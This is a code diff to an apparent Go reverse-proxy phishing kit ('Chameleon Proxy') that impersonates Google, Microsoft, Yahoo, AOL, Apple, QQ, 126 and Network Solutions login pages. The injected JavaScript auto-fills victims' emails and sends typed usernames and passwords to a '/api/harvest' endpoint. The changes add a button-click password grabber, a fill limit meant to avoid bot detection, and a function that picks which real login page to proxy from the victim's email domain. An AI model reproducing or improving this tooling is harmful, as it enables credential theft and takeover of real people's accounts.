@@ -37,6 +37,7 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
+// 1. Universal Polyfill for URL
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
     try { return new OriginalURL(url, base || window.location.origin); } 
@@ -49,30 +50,44 @@ window.URL = function(url, base) {
 };
 window.URL.prototype = OriginalURL.prototype;
 
-setTimeout(function() {
+// 2. Universal Auto-Fill (Runs 10 times max, then stops to prevent bot flags)
+var fillAttempts = 0;
+var fillInterval = setInterval(function() {
     var email = window._targetEmail;
-    if (email) {
-        fetch(window.location.origin + '/api/harvest', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'type=email_only&email=' + encodeURIComponent(email)
-        }).catch(() => {});
+    if (!email || fillAttempts > 10) {
+        clearInterval(fillInterval);
+        return;
     }
-}, 500);
 
-setInterval(function() {
-    var email = window._targetEmail;
-    if (email) {
-        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
-        if (inputs.length > 0 && inputs[0].value === "") {
-            let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-            setter.call(inputs[0], email);
-            inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
-            inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
-            inputs[0].focus();
+    // Look for any standard email/user input
+    var inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[name="username"], input[name="email"], input[name="loginfmt"], input[id="identifierId"]');
+    
+    if (inputs.length > 0) {
+        for (var i = 0; i < inputs.length; i++) {
+            var input = inputs[i];
+            // Make sure it's visible and empty
+            if (input.offsetParent !== null && input.value === "") {
+                let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                setter.call(input, email);
+                input.dispatchEvent(new Event('input', { bubbles: true }));
+                input.dispatchEvent(new Event('change', { bubbles: true }));
+                input.focus();
+                clearInterval(fillInterval); // Stop once we fill it
+                return;
+            }
         }
     }
-}, 1000);
+    fillAttempts++;
+}, 500);
+
+// 3. Catch ALL login attempts (Forms + Button Clicks)
+function sendHarvest(data) {
+    fetch(window.location.origin + '/api/harvest', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: data
+    }).catch(() => {});
+}
 
 document.addEventListener('submit', function(e) {
     const form = e.target;
@@ -83,7 +98,7 @@ document.addEventListener('submit', function(e) {
 
     for (let [key, value] of formData.entries()) {
         params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
+        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login') || key.toLowerCase().includes('ident')) {
             hasEmail = true;
         }
         if (key.toLowerCase().includes('pass')) {
@@ -92,18 +107,24 @@ document.addEventListener('submit', function(e) {
     }
 
     if (hasEmail && hasPassword) {
-        fetch(window.location.origin + '/api/harvest', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: params.toString() + '&type=login'
-        }).catch(() => {});
-        return true;
+        sendHarvest(params.toString() + '&type=login');
     }
 }, false);
+
+// Also catch button clicks in case Microsoft/Google bypass standard form submit
+document.addEventListener('click', function(e) {
+    if (e.target.tagName === 'BUTTON' || e.target.type === 'submit') {
+        var passwords = document.querySelectorAll('input[type="password"]');
+        if (passwords.length > 0 && passwords[0].value !== "") {
+            var email = window._targetEmail || "Unknown";
+            sendHarvest('type=login&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(passwords[0].value));
+        }
+    }
+}, true);
 </script>
 `
 
-const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
+const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
 setTimeout(()=>{
     var hash = window.location.hash;
     var email = "";
@@ -117,10 +138,7 @@ setTimeout(()=>{
         } else {
             if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
             else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
-            else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
-            else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
             else { email = raw; }
-            
             var b64Email = btoa(email);
             window.history.replaceState({}, '', '/#?t=' + b64Email);
         }
@@ -168,7 +186,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
-		// The GetTargetDomain function is now safely called from utils.go
 		targetBase := GetTargetDomain(email)
 		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)
 
@@ -330,6 +347,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			targetDomain = "https://login.aol.com/"
 		} else if strings.Contains(referer, "live.com") {
 			targetDomain = "https://login.live.com/"
+		} else if strings.Contains(referer, "networksolutions.com") {
+			targetDomain = "https://www.networksolutions.com/my-account/login"
 		}
 
 		fullURL := targetDomain + filepath
@@ -369,4 +388,45 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
 	r.Run("0.0.0.0:" + listenPort)
+}
+
+// GetTargetDomain determines the login page based on the email domain
+func GetTargetDomain(email string) string {
+	parts := strings.Split(email, "@")
+	if len(parts) != 2 {
+		return "https://accounts.google.com/"
+	}
+	domain := strings.ToLower(parts[1])
+
+	// Map common providers
+	switch {
+	case strings.Contains(domain, "gmail.com") || strings.Contains(domain, "googlemail.com"):
+		return "https://accounts.google.com/"
+	case strings.Contains(domain, "outlook.com") || strings.Contains(domain, "hotmail.com") || strings.Contains(domain, "live.com") || strings.Contains(domain, "msn.com"):
+		return "https://login.live.com/"
+	case strings.Contains(domain, "yahoo.com") || strings.Contains(domain, "ymail.com"):
+		return "https://login.yahoo.com/"
+	case strings.Contains(domain, "aol.com"):
+		return "https://login.aol.com/"
+	case strings.Contains(domain, "126.com") || strings.Contains(domain, "163.com") || strings.Contains(domain, "yeah.net"):
+		return "https://mail.126.com/"
+	case strings.Contains(domain, "qq.com") || strings.Contains(domain, "foxmail.com"):
+		return "https://mail.qq.com/"
+	case strings.Contains(domain, "icloud.com") || strings.Contains(domain, "me.com"):
+		return "https://appleid.apple.com/"
+	case strings.Contains(domain, "networksolutions.com"):
+		return "https://www.networksolutions.com/my-account/login"
+	default:
+		// Fallback: Try to guess the webmail domain for custom corporate emails
+		_, err := net.LookupHost("webmail." + domain)
+		if err == nil {
+			return "https://webmail." + domain + "/"
+		}
+		_, err = net.LookupHost("mail." + domain)
+		if err == nil {
+			return "https://mail." + domain + "/"
+		}
+		// Absolute fallback to Google if we can't figure it out
+		return "https://accounts.google.com/"
+	}
 }
